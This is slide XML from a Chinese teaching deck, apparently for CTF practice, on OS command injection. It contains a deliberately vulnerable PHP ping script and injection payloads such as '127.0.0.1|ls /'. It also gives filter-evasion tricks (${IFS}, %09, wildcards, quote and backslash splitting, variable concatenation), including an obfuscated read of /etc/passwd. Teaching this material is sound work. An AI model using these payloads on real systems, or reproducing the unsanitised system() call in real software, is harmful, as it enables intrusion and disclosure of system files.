              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1 || cmd2     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>只有当</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>执行失败后，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>才被执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1 &amp; cmd2   Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>：先执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t> cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>，不管是否成功，都会执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t> cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>（顺序执行）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>                               Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>：在后台执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t> cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>，同时执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t> cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>（并行执行）。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>                                                                              </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1 &amp;&amp; cmd2   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>先执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1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cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>执行成功后才执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>，否则不执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1 ; cmd2    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>按顺序依次执行，先执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>再执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>cmd2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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命令连接符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69925" y="462978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dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>$ip = $_POST['ip'];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>system("ping -c 3 " . $ip);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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80" y="1257935"/>
            <a:ext cx="4403090" cy="26917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497330" y="4178935"/>
            <a:ext cx="1757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/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ip=127.0.0.1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7608570" y="4963795"/>
            <a:ext cx="1736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dirty="0"/>
              <a:t>(127.0.0.1|ls /)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="文本框 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7108825" y="54851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/>
              <a:t>以此类推，拼接</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat /flag</a:t>
            </a:r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b="33952"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6497320" y="1257935"/>
            <a:ext cx="4180205" cy="3546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常用代码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>执行函数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191895" y="1273810"/>
            <a:ext cx="1884680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${}</a:t>
            </a:r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执行代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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208770" y="1273810"/>
            <a:ext cx="810260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eval</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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6135" y="2102485"/>
            <a:ext cx="2874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/>
              <a:t>中间的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代码将会被解析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734300" y="19792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/>
              <a:t>将字符串当做函数进行执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>需要传入一个完整的语句</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>必须以分号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> ; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>结尾</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>最常用的函数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5640" y="3261995"/>
            <a:ext cx="2636520" cy="9620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300" y="4584700"/>
            <a:ext cx="3817620" cy="12439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35" y="2839085"/>
            <a:ext cx="2082800" cy="84963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5" y="3876040"/>
            <a:ext cx="4406265" cy="2336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过滤绕过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95020" y="1273810"/>
            <a:ext cx="2103120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空格过滤绕过</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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5020" y="1894205"/>
            <a:ext cx="4732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/>
              <a:t>对于下面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代码，会将空格替换为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>空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750" y="2407920"/>
            <a:ext cx="4055110" cy="13792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07695" y="400526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b="1"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>用 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>${IFS} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>代替空格</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="文本框 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607695" y="4460875"/>
            <a:ext cx="6029960" cy="15684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IFS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>Internal Field Separator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>，默认包含空格、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>tab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>、换行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat${IFS}flag.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>如果 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>{} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>被过滤，可以写：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat$IFSflag.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>或者：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat${IFS}$9flag.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="160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935470" y="136556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b="1"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>其他</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>编码的空白字符</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="文本框 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6935470" y="368014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b="1"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>用重定向符</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t> &lt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6935470" y="506063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b="1"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t> {} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>组合</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="文本框 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7145655" y="1821180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dirty="0"/>
              <a:t>%09 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制表符（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Tab</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>键）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>%0b 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垂直制表符</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>%0c 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换页符</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>%20 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空格（有些过滤只过滤真正的空格字符）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>例如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat%09flag.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>php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236460" y="409384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/>
              <a:t>因为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不需要空格：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat&lt;flag.php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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解析后仍然会输出文件内容。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7145655" y="547433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dirty="0"/>
              <a:t>shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> {} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>展开：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{cat,flag.php}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>等价执行：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat flag.php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过滤绕过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95020" y="1273810"/>
            <a:ext cx="3438525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文件名过滤绕过</a:t>
            </a:r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(</a:t>
            </a:r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如</a:t>
            </a:r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flag)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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5020" y="2385060"/>
            <a:ext cx="5337175" cy="3230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 b="1" dirty="0"/>
              <a:t>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??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*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[]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>绕过</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat /fl??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algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat /fl*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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat /f[a-z]{3}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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat /fla[a-g]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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>以上指令等效于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat /flag</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>、单引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>(')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>双引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>("")</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>反引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>(``)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>绕过正则</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat /fl""ag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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c""at /e't'c/pas``s``wd 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56120" y="2385060"/>
            <a:ext cx="4064000" cy="2922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 b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、反斜杠</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>绕过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:sym typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>特殊字符去掉功能性，单纯表示为字符串，而</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>看到反斜线</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>会自动帮你去掉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>正常执行命令</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>cat fl\ag.p\hp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endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>、内联执行绕过</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a=c;b=a;c=t;$a$b$c /1.txt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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a=f;c=a;d=g;b=l;cat $a$b$c$d.php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abcd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>拼接出来</a:t>
            </a:r>
            <a:r>
